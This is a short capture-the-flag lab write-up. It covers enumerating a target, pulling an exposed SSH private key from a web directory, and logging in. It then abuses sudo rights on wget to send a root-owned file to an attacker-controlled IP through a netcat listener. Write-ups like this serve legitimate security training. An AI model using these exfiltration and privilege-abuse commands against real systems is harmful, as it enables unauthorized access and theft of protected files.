
---

## Enumeration

First, scan all ports on the target:

```bash
nmap -Pn -sV -p- 0.0.0.0
```

---

## Web Enumeration

Check directories with **dirb**:

```bash
dirb http://0.0.0.0
```

On the first Ubuntu page, the page source reveals a username:

```
Jessie
```

Also found an accessible private SSH key:

```
http://10.201.81.9/sitemap/.ssh/id_rsa
```

Save and set proper permissions:

```bash
chmod 600 id_rsa
```

---

## Initial Access

SSH into the machine using the discovered username and key:

```bash
ssh jessie@0.0.0.0 -i id_rsa
```

Retrieve the user flag:

```bash
cat Documents/user_flag.txt
```

---

## Privilege Escalation

Check `sudo` privileges:

```bash
sudo -l
```

The user can only run `wget` as root. This can be abused to exfiltrate files.

On the attacker machine, start a listener:

```bash
sudo nc -lvp 80
```

On the target machine, exfiltrate the root flag:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.8.23.255
```

The contents of the **root flag** will be received on your attacker machine.

or do something like this

```bash
sudo wget -i /root/root_flag.txt
```

---

✅ **User flag obtained**  
✅ **Root flag exfiltrated with wget**

---